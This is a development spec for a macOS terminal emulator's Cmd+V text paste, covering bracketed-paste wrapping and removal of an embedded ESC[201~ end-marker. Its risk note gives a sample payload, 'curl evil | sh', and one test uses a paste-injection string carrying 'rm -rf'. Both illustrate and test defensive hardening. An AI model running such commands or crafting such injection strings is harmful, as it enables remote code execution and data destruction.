# Spec: text-paste

## Meta
- **Created**: 2026-07-23
- **Type**: dev
- **Status**: planned (batch-approved; not yet executed)
- **Set**: clipboard-copy-paste (see `specs/clipboard-copy-paste/partition-manifest.md`)
- **Generated**: via decompose → specify `mode: batch`
- **Approved by**: decompose partition gate (batch — human owns the bar at the ONE partition gate)
- **Approved at**: 2026-07-23

## Goal
Make Cmd+V paste the clipboard's **text** into the active shell. Extend the existing
`ClipboardHandler` (clipboard.rs): when Cmd+V finds no image on the pasteboard (today it
just returns `Passthrough` — the "default text paste" that never existed), read
`NSPasteboardTypeString`, wrap it in bracketed-paste `ESC[200~`/`ESC[201~` when the app
requested that mode (via `AppCtx.bracketed_paste`), and type it into the PTY — multi-line
intact. An image on the pasteboard still follows the existing image path.

## Non-goals
- No selection/copy/highlight (sibling features); no `AppCtx` plumbing (that is
  `selection-input`'s `bracketed_paste` field — this feature only *reads* it).
- No new handler registration (extends the already-registered `ClipboardHandler`).
- No RTF/HTML/file-list paste; plain-string only (baseline).
- No general control-char sanitization beyond neutralizing an embedded end-marker.

## Confirmed Goal
Edit only `crates/app/src/clipboard.rs`: add a pure `wrap_paste(text, bracketed) -> Vec<u8>`
and a `read_clipboard_string()` NSPasteboard read, and route `ClipboardHandler::on_key`'s
no-image branch to type the pasteboard text (bracketed per `AppCtx.bracketed_paste`) and
`Consumed`, or `Passthrough` when there is neither image nor text.

## Declared Surface
- feature-id: text-paste
- depends_on: [selection-input]
- declared-surface:
  - crates/app/src/clipboard.rs

## Research
- `ClipboardHandler::on_key` (`crates/app/src/clipboard.rs:41-69`): returns `Passthrough` if not Cmd+V; then `let Some(png) = read_clipboard_image_png() else { return Handled::Passthrough }` — **this None arm is exactly the "no image → default text paste" seam** the audit calls out (comment at `clipboard.rs:47` "let the default text paste proceed"). On an image it writes the file path + space and `Consumed`.
- `is_paste` already recognizes Cmd+V: `input.mods.super_key() && Key::Character("v")` (`clipboard.rs:72-74`).
- The PTY write channel is `ctx.writer` (`AppCtx.writer: &mut dyn Write`), already used by the image path via `ctx.writer.write_all(&bytes)` (`clipboard.rs:66`, `seam.rs:48`).
- `objc2_app_kit` is already imported with `NSPasteboard`, `NSPasteboardTypePNG`, `NSPasteboardTypeTIFF` (`clipboard.rs:17-20`); the read runs on the UI thread inside `unsafe`. `NSPasteboardTypeString` is the sibling constant for plain text; `pb.stringForType(NSPasteboardTypeString)` returns an `Option<Retained<NSString>>` convertible to a Rust `String`.
- `AppCtx.bracketed_paste: bool` is provided by `selection-input` (its D9), populated in `on_key` from `Terminal::bracketed_paste()` — this feature only reads `ctx.bracketed_paste`.
- Bracketed paste (DECSET 2004): when the app has enabled it, a paste is delimited by `ESC [ 200 ~` … `ESC [ 201 ~` so the app (zsh/editors) treats it as literal data, not typed input. The mode flag is tracked in `selection-model` (`parser.rs` `?2004`).
- The image path is verified by `unique_name` unit tests (`clipboard.rs:137-159`) — pure helpers are the codebase's testable seam; the objc2 read itself is exercised manually (`/run-term`).
- Constraints: macos-only (objc2 NSPasteboard), no `unwrap()` outside tests, `cargo clippy … -D warnings`, `rustfmt` on save.

## Decisions

> SD1–SD5 inherited **verbatim** from `specs/clipboard-copy-paste/partition-manifest.md`.
> D6+ are this feature's local decisions.

### SD1: Selection state rides on the versioned GridSnapshot contract; term-core stays GPU-free and window-free
- **Status**: resolved
- **Rationale**: The dependency-direction rule forbids term-core from touching wgpu/winit and forbids the renderer from seeing a live `Grid`. So the selection is a value type (anchor/focus cell coords) owned in `term-core`; the `Grid` holds the live selection; `GridSnapshot` is EXTENDED (its versioned contract) to carry the selection for the renderer; and cell→String extraction (trailing-whitespace trim, soft-wrapped rows joined) lives in `term-core` beside the existing `GridSnapshot::to_text` (which already skips double-width continuation cells). The renderer only ever reads `GridSnapshot`, never a live `Grid`. Rejected: holding anchor/focus in the app and passing raw coords to the renderer (would leak selection semantics + text extraction out of the headless core, defeating headless testability).

### SD2: The highlight is hand-rolled per-cell drawing on the existing wgpu cell-bg path — no GUI/widget crate
- **Status**: resolved
- **Rationale**: The no-gui-crates rule is the project's reason to exist. The highlight is a `renderer` `DrawLayer` that reads `GridSnapshot`'s selection field and paints the selected cell range by reusing the existing per-cell background quad path (`cells.wgsl`/the bg pipeline), registered through the existing `DrawLayer`/`Overlay` seam (the same seam `ImageLayer`/`ImagePresenter` use). Rejected: any egui/iced/overlay-widget approach, and any bespoke selection shader when the cell-bg path already draws per-cell quads.

### SD3: Clipboard access is objc2 NSPasteboard, consistent with clipboard.rs
- **Status**: resolved
- **Rationale**: The macos-only rule + the existing `clipboard.rs` already use `objc2_app_kit::NSPasteboard` on the UI thread. READ text via `stringForType(NSPasteboardTypeString)`; WRITE via `clearContents` + `setString` (or `writeObjects`). No cross-platform clipboard abstraction, no new clipboard crate. Runs on the UI thread like the existing image read. Rejected: the `arboard`/`copypasta` crates (unnecessary dependency; inconsistent with the established objc2 usage).

### SD4: Input goes through the SD4 InputHandler/Overlay seam; the ONLY event-loop edit is mouse press/drag/release + pixel→cell
- **Status**: resolved
- **Rationale**: The SD4 seam (`InputRouter`/`OverlayHost`, `AppCtx`) exists so features extend input/overlays from their own modules without editing `terminal_app.rs`. Cmd+V (paste) and Cmd+C (copy) are `InputHandler`s dispatched through the router; the highlight is an `Overlay`-provided `DrawLayer`. The necessary exception is the pointer pipeline: `WindowEvent::MouseInput` (Left Pressed/Released) + drag-while-`CursorMoved` + pixel→cell mapping MUST touch the `terminal_app.rs` event loop. Existing sidebar press/hover/wheel and image-paste stay unaffected. Rejected: routing Cmd+C/Cmd+V through new bespoke event-loop branches instead of the seam.

### SD5: Bracketed-paste mode (DECSET/DECRST 2004) follows the existing DECCKM/app_cursor_keys convention
- **Status**: resolved
- **Rationale**: term-core already tracks a private mode this exact way: a `bool` flag on `Grid` (`grid.rs`), a `Terminal` accessor (`lib.rs`), set from `parser.rs` `csi_dispatch` on `?<n> h|l`. Bracketed-paste mode uses the same path: a `bracketed_paste` flag on `Grid`, a `Terminal::bracketed_paste()` accessor, set on `?2004 h|l`. The app reads it via that accessor and surfaces it to input handlers. Rejected: tracking mode 2004 in the app layer or on the `Processor` instead of `Grid`.

### D6: Extend `ClipboardHandler` in place — image-first, then text at the current Passthrough seam
- **Status**: resolved
- **Rationale**: The Cmd+V handler already exists and is registered (`main.rs:52`); its no-image `Passthrough` arm (`clipboard.rs:47`) is the exact insertion point. When `read_clipboard_image_png()` is `None`, read the pasteboard string: if present, write `wrap_paste(text, ctx.bracketed_paste)` to `ctx.writer` and return `Consumed`; if absent, `Passthrough`. The image branch is checked **first** and is byte-unchanged, so an image on the pasteboard still follows the image path (accept seed). Rejected: a separate `PasteTextHandler` registered alongside — it would need its own `main.rs` registration and a defined ordering vs the image handler; extending the one handler keeps all Cmd+V logic and the image-first precedence in a single place.

### D7: Bracketed wrapping is a pure `wrap_paste(text, bracketed) -> Vec<u8>` preserving multi-line content
- **Status**: resolved
- **Rationale**: `wrap_paste` returns `ESC[200~` (`\x1b[200~`) + `text.as_bytes()` + `ESC[201~` (`\x1b[201~`) when `bracketed`, else just `text.as_bytes()`. Newlines and all interior bytes pass through verbatim so multi-line pastes stay intact (accept seed). Keeping it pure makes it unit-testable without a pasteboard (the codebase's testable-seam pattern). Rejected: stripping/normalizing newlines (breaks multi-line paste); emitting CR vs LF translation (the shell/PTY owns line discipline — do not second-guess it here).

### D8: When bracketing, neutralize an embedded end-marker so the paste can't forge `ESC[201~`
- **Status**: resolved
- **Rationale**: Standard bracketed-paste hardening: if the pasted text itself contains the terminator `ESC[201~`, a naive wrap would let pasted content escape the paste envelope and be interpreted as commands. `wrap_paste` **removes the whole `ESC[201~` byte sequence** from `text` before wrapping (only when `bracketed`) — deliberately full-sequence removal, not just dropping the `ESC`; the surrounding tokens may concatenate (`a\x1b[201~b` → `ab`), which is acceptable because the input is already adversarial and the goal is only that no interior terminator survives. Neutralization applies **only** in bracketed mode: when 2004 is off, `ESC[201~` is not a terminator, so neutralizing it would be meaningless and would corrupt legitimate data. This is the minimal, targeted defense for the envelope. Rejected: dropping only the `ESC` (leaves a literal `[201~`), stripping all C0 control characters (too aggressive — legitimate tabs/newlines are wanted), and doing nothing (a real paste-injection footgun). **Scope boundary (accepted residual):** with 2004 **off**, pasted text — newlines included — is delivered verbatim and its subsequent lines can execute immediately; this is the conventional terminal paste boundary, deliberately accepted, and out of scope for `wrap_paste` (see Known Gaps).

## Constraints
- Only `clipboard.rs` may change (declared surface). The image path (`read_clipboard_image_png`, `pasted_dir`, `unique_name`, and the image branch of `on_key`) must stay behavior-identical.
- macos-only objc2 NSPasteboard on the UI thread; no cross-platform clipboard crate; no `#[cfg(target_os)]`.
- No `unwrap()`/`expect()` outside tests; `cargo clippy --workspace --all-targets -- -D warnings` clean; `rustfmt` on save.
- Reads `AppCtx.bracketed_paste` (provided by `selection-input`); adds no new field to `AppCtx`.

## Known Gaps
- Only plain `NSPasteboardTypeString` is read; RTF/HTML/file-URL flavors are not (a URL/file paste yields its string form or nothing).
- **Accepted residual security posture:** with bracketed-paste mode **off**, pasted text is delivered to the PTY verbatim — including newlines — so a multi-line clipboard payload like `foo\ncurl evil | sh\n` runs its subsequent line(s) immediately. This is the conventional terminal paste boundary (the same as Terminal.app/iTerm2 without a paste-confirm), deliberately accepted here; the `ESC[201~` neutralization (D8) hardens only the *bracketed* envelope, and broader control-char sanitization / a paste-confirm prompt is a deferred hardening.
- If both an image and text are on the pasteboard, the image wins (existing precedence, unchanged). An image that is present but *unsaveable* (no `$HOME`, or the PNG write fails) stays on the image path's `Passthrough` and does **not** fall back to text — a rare edge, consistent with "image wins".

## Requirements

### R0: Cmd+V pastes text without disturbing the image path
#### R0.1: An image on the pasteboard still pastes as a file path
- **Given**: an image (PNG/TIFF) on the general pasteboard
- **When**: Cmd+V is pressed
- **Then**: the existing image path runs — a PNG is written under the cache dir and its path + space is typed — exactly as before (Consumed)
#### R0.2: The wrapping logic is pure and headlessly testable
- **Given**: `wrap_paste`
- **When**: `cargo test -p app` runs
- **Then**: bracketed/plain/multi-line/embedded-marker cases are asserted without an NSPasteboard

### R1: Text is read from the pasteboard and typed into the PTY
#### R1.1: Cmd+V with text (no image) types the text
- **Given**: no image but the string `"echo hi"` on the pasteboard, bracketed mode off
- **When**: Cmd+V is pressed
- **Then**: `read_clipboard_string()` returns `"echo hi"`, the bytes `echo hi` are written to `ctx.writer`, and the handler returns `Consumed`

### R2: Bracketed-paste wrapping follows `AppCtx.bracketed_paste`
#### R2.1: Bracketed mode on wraps the text
- **Given**: `wrap_paste("ls", true)`
- **When**: called
- **Then**: it returns `\x1b[200~ls\x1b[201~` (as bytes)
#### R2.2: Bracketed mode off passes the text through
- **Given**: `wrap_paste("ls", false)`
- **When**: called
- **Then**: it returns exactly `ls` (no wrapper bytes)

### R3: Multi-line paste is preserved intact
#### R3.1: Newlines pass through unchanged
- **Given**: `wrap_paste("a\nb\nc", false)`
- **When**: called
- **Then**: it returns `a\nb\nc` with both newlines intact (byte-for-byte)
#### R3.2: Multi-line under bracketed mode keeps the interior newlines
- **Given**: `wrap_paste("a\nb", true)`
- **When**: called
- **Then**: it returns `\x1b[200~a\nb\x1b[201~` (interior `\n` preserved between the markers)

### R4: No image and no text falls through
#### R4.1: Empty pasteboard passes through
- **Given**: neither an image nor a string on the pasteboard
- **When**: Cmd+V is pressed
- **Then**: the handler returns `Passthrough` (nothing typed)

### R5: An embedded end-marker cannot break out of the paste envelope
#### R5.1: An embedded `ESC[201~` is neutralized when bracketing
- **Given**: `wrap_paste("evil\x1b[201~rm -rf", true)`
- **When**: called
- **Then**: the result begins `\x1b[200~`, ends `\x1b[201~`, and contains **no** interior `\x1b[201~` (the embedded marker's full byte sequence removed so it cannot terminate the paste early)
#### R5.2: Without bracketing, the text is passed through unchanged
- **Given**: `wrap_paste("evil\x1b[201~x", false)`
- **When**: called
- **Then**: the text is returned verbatim (neutralization applies only inside the bracketed envelope)

## Tasks

### T1: `wrap_paste` pure helper + unit tests [infra]
- **Fulfills**: R2, R3, R5, R0.2
- **Depends on**: (none)
- Add `fn wrap_paste(text: &str, bracketed: bool) -> Vec<u8>` to `clipboard.rs`: bracketed → `\x1b[200~` + (text with embedded `\x1b[201~` neutralized) + `\x1b[201~`; else `text.as_bytes()`. Unit tests for R2.1/R2.2, R3.1/R3.2, R5.1/R5.2.

### T2: `read_clipboard_string` + text branch in `on_key` [core]
- **Fulfills**: R0.1, R1, R4
- **Depends on**: T1
- Add `fn read_clipboard_string() -> Option<String>` (objc2 `stringForType(NSPasteboardTypeString)` → `String`), and route `ClipboardHandler::on_key`'s no-image arm: `Some(text)` → `ctx.writer.write_all(&wrap_paste(&text, ctx.bracketed_paste))` + `Consumed`; `None` → `Passthrough`. Leave the image branch byte-unchanged (R0.1).

## External Dependencies

### Pre-work
- (none) — `objc2_app_kit` already a dependency; `AppCtx.bracketed_paste` comes from `selection-input`.

### Post-work
- (none).
